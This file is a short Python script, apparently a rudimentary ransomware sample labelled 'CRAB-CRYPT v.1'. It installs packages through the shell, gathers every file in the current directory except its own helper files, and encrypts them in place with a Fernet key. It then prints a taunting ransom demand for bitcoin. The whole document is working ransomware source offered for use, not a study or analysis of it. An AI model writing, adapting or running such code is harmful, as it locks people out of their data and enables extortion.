#!/usr/bin/env python3

import os
import time
from cryptography.fernet import Fernet


#BANNER
print(
"""


░█████╗░██████╗░░█████╗░██████╗░░░░░░░░█████╗░██████╗░██╗░░░██╗██████╗░████████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗░░░░░░██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝
██║░░╚═╝██████╔╝███████║██████╦╝█████╗██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░
██║░░██╗██╔══██╗██╔══██║██╔══██╗╚════╝██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░
╚█████╔╝██║░░██║██║░░██║██████╦╝░░░░░░╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░
			
				 v.1
			     @ALPERNAE

""")


# INSTALL REQ. FOR LINUX

os.system("apt-get install python3,python3-pip")
os.system("pip install cryptography")


#FIND FILES

files = []

for file in os.listdir():
	if file == "creeper.py" or file == "secret.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print("Generating encryption key!")
time.sleep(2)
print("Encryption key generated!")
time.sleep(2)
print(files,"\nAll files ENCRYPTED!!! LOOOSSEEER :)))\nSend me money bitcoin wallet:\n{BITCOIN_ADRESS}")


# Encrypt files

key = Fernet.generate_key()

with open("secret.key", "wb") as secret:
	secret.write(key)


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)
